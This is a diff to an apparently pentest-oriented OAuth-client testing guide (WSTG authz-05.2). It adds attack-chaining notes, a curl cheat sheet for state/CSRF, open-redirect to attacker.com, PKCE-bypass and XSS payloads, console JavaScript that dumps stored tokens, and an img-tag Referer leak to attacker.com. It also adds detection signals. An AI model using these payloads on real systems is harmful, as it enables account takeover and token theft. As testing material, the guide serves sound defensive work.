@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [authorization, access-control, privilege, wstg, authz]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-authz-01, wstg-authz-02]
+prerequisites: [wstg-authz-05, wstg-idnt-01, wstg-idnt-02]
+severity_boost:
+  wstg-authz-01: "OAuth Client Token Mishandling + Directory Traversal = access/refresh tokens stored insecurely on disk are read directly, yielding valid tokens for other users (Critical)"
+  wstg-authz-02: "OAuth Client CSRF/Response Validation Flaw + Authorization Bypass = attacker hijacks the client's OAuth flow (e.g. missing state/nonce check) and rides the authorization bypass to full account takeover (Critical)"
 ---
 
 # wstg-authz-05.2
@@ -501,6 +503,65 @@ tester.generate_report()
 
 ---
 
+## Example Commands/Payloads
+
+### Ready-to-Use OAuth Client Cheat Sheet
+
+```bash
+CLIENT="https://client.{target}"
+
+# Capture the client's authorization request to inspect state/PKCE/response_type
+curl -s -D - -o /dev/null "$CLIENT/login/oauth" | grep -i "^location:"
+
+# Callback with no / empty / attacker-controlled state (CSRF login test)
+curl -s "$CLIENT/oauth/callback?code=AUTH_CODE"
+curl -s "$CLIENT/oauth/callback?code=AUTH_CODE&state="
+curl -s "$CLIENT/oauth/callback?code=AUTH_CODE&state=attacker_controlled"
+
+# Open-redirect via post-login "next"/"redirect"/"return_to" params
+for p in next redirect return_to redirect_uri continue; do
+  curl -s -I "$CLIENT/oauth/callback?code=AUTH_CODE&state=VALID&$p=https://attacker.com"
+done
+
+# Token-exchange without PKCE code_verifier (should fail if PKCE required)
+curl -s -X POST "https://auth.{target}/oauth/token" \
+    -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=$CLIENT/callback&client_id={client_id}"
+
+# Browser-console check for insecure token storage (paste after login)
+cat <<'JS'
+Object.keys(localStorage).filter(k => /token|auth|jwt/i.test(k))
+  .forEach(k => console.log('localStorage:', k, localStorage[k]));
+Object.keys(sessionStorage).filter(k => /token|auth|jwt/i.test(k))
+  .forEach(k => console.log('sessionStorage:', k, sessionStorage[k]));
+JS
+
+# Logout / session invalidation check
+curl -s -c cookies.txt "$CLIENT/login"
+curl -s -b cookies.txt "$CLIENT/logout"
+curl -s -b cookies.txt -o /dev/null -w "post-logout dashboard -> %{http_code}\n" "$CLIENT/dashboard"
+
+# XSS via redirect_uri (data: URI) with payload smuggled through `state`
+curl -s "$CLIENT/oauth/authorize?redirect_uri=data:text/html,a&state=<script>alert(document.domain)</script>"
+
+# HTML-injection-only Referer leak — if the client reflects unsanitized HTML anywhere
+# (no full XSS needed), plant <img src="https://attacker.com/log"> and lure the victim
+# there post-login; Referer on that request carries the still-in-URL code/token.
+# Confirm exposure by checking for a Referrer-Policy header on the callback response:
+curl -sI "$CLIENT/oauth/callback" | grep -i "referrer-policy"
+```
+
+### Detection Patterns
+
+| Signal                                              | Meaning                          |
+| ------------------------------------------------------ | ------------------------------------ |
+| Callback accepted with missing/empty/mismatched state    | Client-side CSRF (state not validated) |
+| `next=https://attacker.com` produces a redirect            | Open redirect after auth            |
+| Token issued without `code_verifier`                       | PKCE not enforced by client         |
+| `access_token`/`jwt` visible in `localStorage`              | Insecure token storage (XSS-stealable) |
+| Dashboard reachable after logout with old session cookie    | Session not invalidated on logout   |
+
+---
+
 ## Remediation Guide
 
 ### 1. Secure Token Storage
@@ -730,6 +791,7 @@ def oauth_callback():
 - [OAuth 2.0 for Native Apps](https://tools.ietf.org/html/rfc8252)
 - [PKCE RFC 7636](https://tools.ietf.org/html/rfc7636)
 - [OAuth Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
+- [PayloadsAllTheThings - OAuth Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth%20Misconfiguration)
 
 
 ---
